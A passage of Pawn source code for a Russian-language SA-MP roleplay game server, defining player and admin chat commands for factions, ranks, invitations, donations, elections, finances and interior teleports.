				SetPlayerInterior(playerid,0);
				SetPlayerCameraPos(i,1716.2295,-706.2784,78.0388);
				SetPlayerCameraLookAt(i,1711.8879,-744.0065,78.0388);
				TogglePlayerControllable(i,false);
			}
		}
		SaveAcc();
		SaveShahta();
		SetTimer("GMX", 3000, 0);
		GameTextForAll("~g~PLEASE WAIT", 5000, 5);
	}
	return true;
}
CMD:amusic(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	ShowPlayerDialog(playerid, 2631, DIALOG_STYLE_INPUT, "Music", "Функция позволяет включать аудиопоток около вас\nВведите URL аудиофайла или потока", "Принять", "Отмена");
	return true;
}
CMD:makeleader(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /makeleader [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pLeader] > 0)
	{
		SetFractionStr(PlayerInfo[params[0]][pLeader], "leader", "None");
		strmid(FracInfo[PlayerInfo[params[0]][pLeader]][fLeader],"None",0,strlen("None"),MAX_PLAYER_NAME);
		if(PlayerInfo[params[0]][pLeader] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
		LeaveFractionPlayer(params[0]);
		SendMes(playerid, COLOR_ORANGE, "Вы сняли %s с должности лидера организации ",sendername(params[0]));
		SendMes(params[0], COLOR_BLUE, "Администратор %s снял вас с должности лидера организации", PlayerInfo[playerid][pSendername]);
		ResetWeapon(params[0]);
	}
	else
	{
		if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		if(PlayerInfo[params[0]][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		new str[90], str2[512];
		for(new i = 1; i <= TOTALFRAC; i++)
		{
			format(str,sizeof(str),"№%i - %s\n",i,FracInfo[i][fName]);
			strcat(str2, str);
		}
		SetPVarInt(playerid, "PlayerLeader", params[0]);
		ShowPlayerDialog(playerid, D_FRACMENU, 2, "Организации", str2, "Принять", "Отмена");
	}
	return true;
}

CMD:ainvite(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /ainvite [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
	if(PlayerInfo[params[0]][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
	if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находиться в транспорте!");
	new str[90], str2[512];
	for(new i = 1; i <= TOTALFRAC; i++)
	{
		format(str,sizeof(str),"Организация №%i - %s\n",i,FracInfo[i][fName]);
		strcat(str2, str);
	}
	SetPVarInt(playerid, "PlayerLeader", params[0]);
	ShowPlayerDialog(playerid, D_FRACMENU+3, 2, "Организации", str2, "Принять", "Отмена");
	return true;
}

CMD:f(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] >= 6 && PlayerInfo[playerid][pMember] <= 12 || PlayerInfo[playerid][pMember] > 13)
	{
		
		if(SendFamily[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Ваш семейный чат отключен!");
		if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
		if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /f [текст]");
		if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
		format(totalstring,128,"[F] %s %s: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
		SendFMes(PlayerInfo[playerid][pMember], TEAM_AZTECAS_COLOR, totalstring);
		printf("[F] [%s] %s %s: %s",FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:fb(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] >= 6 && PlayerInfo[playerid][pMember] <= 12 || PlayerInfo[playerid][pMember] > 13)
	{

		if(SendFamily[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Ваш семейный чат отключен!");
		if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
		if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /fb [текст]");
		if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
		format(totalstring,128,"[F] (( %s %s: %s ))",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
		SendFMes(PlayerInfo[playerid][pMember], TEAM_AZTECAS_COLOR, totalstring);
		printf("[F] [%s] %s %s: %s",FracInfo[PlayerInfo[playerid][pMember]][fName],FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:r(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY || PlayerInfo[playerid][pMember] == F_HOSPITAL || PlayerInfo[playerid][pMember] == F_MAYOR)
	{
		if(SendFamily[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Ваш семейный чат отключен!");
		if(PlayerInfo[playerid][pMuted] >0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
		if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /f [текст]");
		if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
		format(totalstring,128,"[R] %s %s: %s",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
		SendFMes(PlayerInfo[playerid][pMember], TEAM_BLUE_COLOR, totalstring);
		printf("[R] [%s] %s %s: %s",FracInfo[PlayerInfo[playerid][pMember]][fName], FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:d(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(IsACop(playerid) || PlayerInfo[playerid][pMember] == F_ARMY || PlayerInfo[playerid][pMember] == F_HOSPITAL || PlayerInfo[playerid][pMember] == F_MAYOR)
	{
		if(SendFamily[playerid] == 0) return SendClientMessage(playerid, COLOR_GREY, "Ваш семейный чат отключен!");
		if(PlayerInfo[playerid][pMuted] > 0) return SendClientMessage(playerid, COLOR_PURPLE, PlayerHaveMuteTime);
		if(sscanf(params, "s[64]", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /d [текст]");
		if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
		format(totalstring,128,"[%s] %s %s: %s",FracInfo[PlayerInfo[playerid][pMember]][fName], FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
		SendDMes(COLOR_ALLDEPT, totalstring);
		printf("[D] [%s] %s %s: %s",FracInfo[PlayerInfo[playerid][pMember]][fName], FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]],PlayerInfo[playerid][pSendername],params[0]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:members(playerid, params[])
{
    if(PlayerLogged[playerid] == 0) return 1;
    if(PlayerInfo[playerid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
    SendClientMessage(playerid, 0x33AAFFFF, "Члены организации в сети:");
    for(new i = 0; i < GetMaxPlayers(); i++)
    {
        if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
        if(PlayerInfo[i][pMember] == PlayerInfo[playerid][pMember]) SendMes(playerid, COLOR_WHITE, "%s » {66ff00}%s",sendername(i), FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]]);
    }
    return 1;
}

CMD:donate(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pCredits] == 0) return ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Донат","Донат - получение дополнительных средств путем материальной помощи серверу\nДля пополнения счета посетите наш сайт:\n"Namesite"", "Закрыть", "");
	ShowPlayerDialog(playerid, D_DONATE, DIALOG_STYLE_LIST, "{66CC33}Донат {FFFFFF}- основное меню", "• Рубли в игровые деньги\n• Прокачка аккаунта\n• Купить VIP аккуант", "Далее", "Отмена");
	return true;
}

CMD:cinfo(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pMember] == F_CASINO)
	{
		SendClientMessage(playerid, COLOR_YELLOW, "Казино: Caligula's");
		SendMes(playerid, COLOR_GREEN, "Банк казино: %d",FracBank[11]);
		SendClientMessage(playerid, COLOR_YELLOW, "Крупье онлайн");
		foreach(new i:Player)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
			if(PlayerInfo[i][pMember] == F_CASINO) SendMes(playerid, COLOR_WHITE, "%s Должность: %s",PlayerInfo[i][pSendername], FracRank[PlayerInfo[i][pMember]][PlayerInfo[i][pRank]]);
		}
	}
	return true;
}

CMD:invite(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pMember] > 0 && strcmp(PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fAssistant],true) == 0)
	{
		if(PlayerInfo[playerid][pLeader] == 0) if(FracInfo[PlayerInfo[playerid][pMember]][fHelper][0] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /invite [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		if(PlayerInfo[params[0]][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находиться в транспорте!");
		SendMes(playerid,COLOR_BLUE,"Вы предложили %s присоединиться в вашу организацию",sendername(params[0]));
		format(totalstring,128,"%s %s предлагает вам присоединиться к \"%s\"\n\nВы согласны?",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerid][pMember]][fName]);
		SendMes(params[0],COLOR_BLUE,"%s %s предлагает вам присоединиться к \"%s\"",FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername], FracInfo[PlayerInfo[playerid][pMember]][fName]);
		SetPVarInt(params[0], "PlayerInvite", playerid);
		ShowPlayerDialog(params[0], D_INVITEFRAC, 0, "Фракция",totalstring,"Да","Нет");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:viphelp(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
		format(totalstring,128, "Счетчик помощи: %d/8 Кредитов", PlayerInfo[playerid][pTotalCredits]);
		SendClientMessage(playerid, COLOR_YELLOW, totalstring);
		SendClientMessage(playerid, COLOR_NEWS, "Команды VIP: /togphone - вкл/выкл. телефон!");
		SendClientMessage(playerid, COLOR_NEWS, "Команды VIP: /admins - админы Он-Лайн");
		SendClientMessage(playerid, COLOR_NEWS, "Команды VIP: /vipuninvite - уволиться из организации");
		SendClientMessage(playerid, COLOR_NEWS, "------------------------------------------");
	}
	return true;
}

CMD:vuninvite(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pVIP] == false) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	if(PlayerInfo[playerid][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в организации!");
	if(PlayerInfo[playerid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не должны быть лидером!");
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вы не должны находиться в транспорте!");
	SendMes(playerid, COLOR_BLUE, "Вы покинули организацию: %s", FracInfo[PlayerInfo[playerid][pMember]][fName]);
	LeaveFractionPlayer(playerid);
	return true;
}

CMD:uninvite(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pMember] > 0 && strcmp(PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fAssistant],true) == 0)
	{
		if(PlayerInfo[playerid][pLeader] == 0) if(FracInfo[PlayerInfo[playerid][pMember]][fHelper][1] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNot);
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /uninvite [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(PlayerInfo[params[0]][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
		if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		SendMes(playerid, COLOR_BLUE, "Вы уволили %s из организации \"%s\"",sendername(params[0]),FracInfo[PlayerInfo[playerid][pMember]][fName]);
		SendMes(params[0], COLOR_BLUE, "%s %s уволил вас из организации \"%s\"", FracRank[PlayerInfo[playerid][pMember]][PlayerInfo[playerid][pRank]], PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fName]);
		LeaveFractionPlayer(params[0]);
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:auninvite(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /auninvite [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
	if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
	new member = PlayerInfo[params[0]][pMember];
	SendMes(playerid, COLOR_ORANGE, "Вы уволили %s из организации \"%s\"",sendername(params[0]),FracInfo[member][fName]);
	SendMes(params[0], COLOR_BLUE, "Администратор %s уволил вас из организации \"%s\"",PlayerInfo[playerid][pSendername],FracInfo[member][fName]);
	LeaveFractionPlayer(params[0]);
	return true;
}

CMD:giverank(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pLeader] > 0 || PlayerInfo[playerid][pMember] > 0 && strcmp(PlayerInfo[playerid][pSendername],FracInfo[PlayerInfo[playerid][pMember]][fAssistant],true) == 0)
	{
		if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /giverank [id игрока]");
		if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
		if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
		if(PlayerInfo[playerid][pLeader] > 0 && params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Лидер не может дать себе ранг!");
		if(PlayerInfo[params[0]][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
		if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		if(PlayerInfo[params[0]][pMember] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		new str[90], str2[512], full = 0;
		for(new i = 1; i <= MAX_RANK; i++)
		{
			if(PlayerInfo[playerid][pMember] == F_ARMY && i == 13) break;
			if(!strcmp(FracRank[PlayerInfo[playerid][pMember]][i+1], "None",true)) break;
			format(str,sizeof(str),"Ранг №%i - %s\n",i,FracRank[PlayerInfo[playerid][pMember]][i]);
			strcat(str2, str);
			full++;
		}
		if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Обратитесь к администрации!");
		SetPVarInt(playerid, "PlayerRank", params[0]);
		ShowPlayerDialog(playerid, D_FRACMENU+1, 2, "Ранг", str2, "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:agiverank(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /agiverank [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(PlayerInfo[params[0]][pMember] == 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок не находиться в организации!");
	if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
	new str[64], str2[512], full = 0;
	for(new i = 1; i <= MAX_RANK; i++)
	{
		if(PlayerInfo[params[0]][pMember] == F_ARMY && i == 13) break;
		if(!strcmp(FracRank[PlayerInfo[params[0]][pMember]][i+1], "None",true)) break;
		format(str,sizeof(str),"Ранг №%i - %s\n",i,FracRank[PlayerInfo[params[0]][pMember]][i]);
		strcat(str2, str);
		full++;
	}
	if(full == 0) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Обратитесь к администрации!");
	SetPVarInt(playerid, "PlayerRank", params[0]);
	ShowPlayerDialog(playerid, D_FRACMENU+2, 2, "Ранг", str2, "Принять", "Отмена");
	return true;
}

CMD:spawnchange(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new house = 0;
	for(new i = 1; i <= TOTALHOUSE;i++)
	{
		if(!strcmp(HouseInfo[i][hOwner],PlayerInfo[playerid][pSendername],true)) house++;
	}
	if(house != 0)
	{
		if(PlayerInfo[playerid][pSpawnChange] != 0) SendClientMessage(playerid, COLOR_WHITE, "Теперь вы будете возраждаться в обычном месте! (Сохранено)"), PlayerInfo[playerid][pSpawnChange] = 0;
		else SendClientMessage(playerid, COLOR_WHITE, "Теперь вы будете возраждаться дома! (Сохранено)"), PlayerInfo[playerid][pSpawnChange] = 1;
	}
	else SendClientMessage(playerid, COLOR_GREY, PlayerDoNotHaveAtHome);
	return true;
}

CMD:getpick(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(Pick == false) return SendClientMessage(playerid, COLOR_GREY, "В штате нет выборов!");
	GetPick(playerid);
	return true;
}

CMD:pick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	ShowPlayerDialog(playerid, D_PICK+3, 2, "Выборы", "Начать выборы\nЗакончить выоборы\nИзменить имена кандидатов", "Принять", "Отмена");
	return true;
}

CMD:picklist(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(Pick == true) return SendClientMessage(playerid, COLOR_GREY, "В штате не закончены выборы!");
	GetPick(playerid);
	return true;
}

CMD:exchequer(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] > 4 || PlayerInfo[playerid][pLeader] == F_MAYOR || PlayerInfo[playerid][pMember] == F_MAYOR && PlayerInfo[playerid][pRank] == 11)
	{
		ShowPlayerDialog(playerid, D_INFL, 2, "Меню финансов", "Установить уровень инфляции\nУстановить уровень налогов жителей\nУстановить уровень зарплаты ЛСПД\nУстановить уровень зарплаты СФПД\nУстановить уровень зарплаты ФБР\nУстановить уровень зарплаты МЧС\nУстановить уровень зарплаты Зоны 51", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:getexchequer(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] > 4 || PlayerInfo[playerid][pLeader] == F_MAYOR || PlayerInfo[playerid][pMember] == F_MAYOR && PlayerInfo[playerid][pRank] == 11)
	{
		ShowPlayerDialog(playerid, D_INFL+2, 2, "Меню финансов", "Узнать уровень инфляции\nУзнать уровень налогов жителей\nУзнать уровень зарплаты\nУзнать кол-во средств в казне", "Принять", "Отмена");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}

CMD:intt(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /loc [id локации]");
	if(params[0] < 1 || params[0] > 134) return SendClientMessage(playerid, COLOR_GREY, "ID локации от 1 до 134!");
	switch(params[0]) {
	case 1: { SetPlayerPos(playerid,-25.884499,-185.868988,1003.549988); SetPlayerInterior(playerid,17); }
	case 2: { SetPlayerPos(playerid,6.091180,-29.271898,1003.549988); SetPlayerInterior(playerid,10); }
	case 3: { SetPlayerPos(playerid,-30.946699,-89.609596,1003.549988); SetPlayerInterior(playerid,18); }
	case 4: { SetPlayerPos(playerid,-25.132599,-139.066986,1003.549988); SetPlayerInterior(playerid,16); }
	case 5: { SetPlayerPos(playerid,-27.312300,-29.277599,1003.549988); SetPlayerInterior(playerid,4); }
	case 6: { SetPlayerPos(playerid,-26.691599,-55.714897,1003.549988); SetPlayerInterior(playerid,6); }
	case 7: { SetPlayerPos(playerid,-1827.147338,7.207418,1061.143554); SetPlayerInterior(playerid,14); }
	case 8: { SetPlayerPos(playerid,2.384830,33.103397,1199.849976); SetPlayerInterior(playerid,1); }
	case 9: { SetPlayerPos(playerid,315.856170,1024.496459,1949.797363); SetPlayerInterior(playerid,9); }
	case 10: { SetPlayerPos(playerid,286.148987,-40.644398,1001.569946); SetPlayerInterior(playerid,1); }
	case 11: { SetPlayerPos(playerid,286.800995,-82.547600,1001.539978); SetPlayerInterior(playerid,4); }
	case 12: { SetPlayerPos(playerid,296.919983,-108.071999,1001.569946); SetPlayerInterior(playerid,6); }
	case 13: { SetPlayerPos(playerid,314.820984,-141.431992,999.661987); SetPlayerInterior(playerid,7); }
	case 14: { SetPlayerPos(playerid,316.524994,-167.706985,999.661987); SetPlayerInterior(playerid,6); }
	case 15: { SetPlayerPos(playerid,302.292877,-143.139099,1004.062500); SetPlayerInterior(playerid,7); }
	case 16: { SetPlayerPos(playerid,235.508994,1189.169897,1080.339966); SetPlayerInterior(playerid,3); }
	case 17: { SetPlayerPos(playerid,225.756989,1240.000000,1082.149902); SetPlayerInterior(playerid,2); }
	case 18: { SetPlayerPos(playerid,223.043991,1289.259888,1082.199951); SetPlayerInterior(playerid,1); }
	case 19: { SetPlayerPos(playerid,225.630997,1022.479980,1084.069946); SetPlayerInterior(playerid,7); }
	case 20: { SetPlayerPos(playerid,295.138977,1474.469971,1080.519897); SetPlayerInterior(playerid,15); }
	case 21: { SetPlayerPos(playerid,328.493988,1480.589966,1084.449951); SetPlayerInterior(playerid,15); }
	case 22: { SetPlayerPos(playerid,385.803986,1471.769897,1080.209961); SetPlayerInterior(playerid,15); }
	case 23: { SetPlayerPos(playerid,375.971985,1417.269897,1081.409912); SetPlayerInterior(playerid,15); }
	case 24: { SetPlayerPos(playerid,490.810974,1401.489990,1080.339966); SetPlayerInterior(playerid,2); }
	case 25: { SetPlayerPos(playerid,447.734985,1400.439941,1084.339966); SetPlayerInterior(playerid,2); }
	case 26: { SetPlayerPos(playerid,227.722992,1114.389893,1081.189941); SetPlayerInterior(playerid,5); }
	case 27: { SetPlayerPos(playerid,260.983978,1286.549927,1080.299927); SetPlayerInterior(playerid,4); }
	case 28: { SetPlayerPos(playerid,221.666992,1143.389893,1082.679932); SetPlayerInterior(playerid,4); }
	case 29: { SetPlayerPos(playerid,27.132700,1341.149902,1084.449951); SetPlayerInterior(playerid,10); }
	case 30: { SetPlayerPos(playerid,-262.601990,1456.619995,1084.449951); SetPlayerInterior(playerid,4); }
	case 31: { SetPlayerPos(playerid,22.778299,1404.959961,1084.449951); SetPlayerInterior(playerid,5); }
	case 32: { SetPlayerPos(playerid,140.278000,1368.979980,1083.969971); SetPlayerInterior(playerid,5); }
	case 33: { SetPlayerPos(playerid,234.045990,1064.879883,1084.309937); SetPlayerInterior(playerid,6); }
	case 34: { SetPlayerPos(playerid,-68.294098,1353.469971,1080.279907); SetPlayerInterior(playerid,6); }
	case 35: { SetPlayerPos(playerid,-285.548981,1470.979980,1084.449951); SetPlayerInterior(playerid,15); }
	case 36: { SetPlayerPos(playerid,-42.581997,1408.109985,1084.449951); SetPlayerInterior(playerid,8); }
	case 37: { SetPlayerPos(playerid,83.345093,1324.439941,1083.889893); SetPlayerInterior(playerid,9); }
	case 38: { SetPlayerPos(playerid,260.941986,1238.509888,1084.259888); SetPlayerInterior(playerid,9); }
	case 39: { SetPlayerPos(playerid,1038.509888,-0.663752,1001.089966); SetPlayerInterior(playerid,3); }
	case 40: { SetPlayerPos(playerid,446.622986,509.318970,1001.419983); SetPlayerInterior(playerid,12); }
	case 41: { SetPlayerPos(playerid,2216.339844,-1150.509888,1025.799927); SetPlayerInterior(playerid,15); }
	case 42: { SetPlayerPos(playerid,833.818970,7.418000,1004.179993); SetPlayerInterior(playerid,3); }
	case 43: { SetPlayerPos(playerid,-100.325996,-22.816500,1000.741943); SetPlayerInterior(playerid,3); }
	case 44: { SetPlayerPos(playerid,964.376953,2157.329834,1011.019958); SetPlayerInterior(playerid,1); }
	case 45: { SetPlayerPos(playerid,-2239.569824,130.020996,1035.419922); SetPlayerInterior(playerid,6); }
	case 46: { SetPlayerPos(playerid,662.641601,-571.398803,16.343263); SetPlayerInterior(playerid,0); }
	case 47: { SetPlayerPos(playerid,614.581420,-23.066856,1004.781250); SetPlayerInterior(playerid,1); }
	case 48: { SetPlayerPos(playerid,612.508605,-129.236114,1001.992187); SetPlayerInterior(playerid,3); }
	case 49: { SetPlayerPos(playerid,-1786.603759,1215.553466,28.531250); SetPlayerInterior(playerid,0); }
	case 50: { SetPlayerPos(playerid,-2048.605957,162.093444,28.835937); SetPlayerInterior(playerid,1); }
	case 51: { SetPlayerPos(playerid,2170.284,1618.629,999.9766); SetPlayerInterior(playerid,1); }
	case 52: { SetPlayerPos(playerid,1889.975,1018.055,31.88281); SetPlayerInterior(playerid,10); }
	case 53: { SetPlayerPos(playerid,-2158.719971,641.287964,1052.369995); SetPlayerInterior(playerid,1); }
	case 54: { SetPlayerPos(playerid,1133.069946,-9.573059,1000.750000); SetPlayerInterior(playerid,12); }
	case 55: { SetPlayerPos(playerid,207.737991,-109.019997,1005.269958); SetPlayerInterior(playerid,15); }
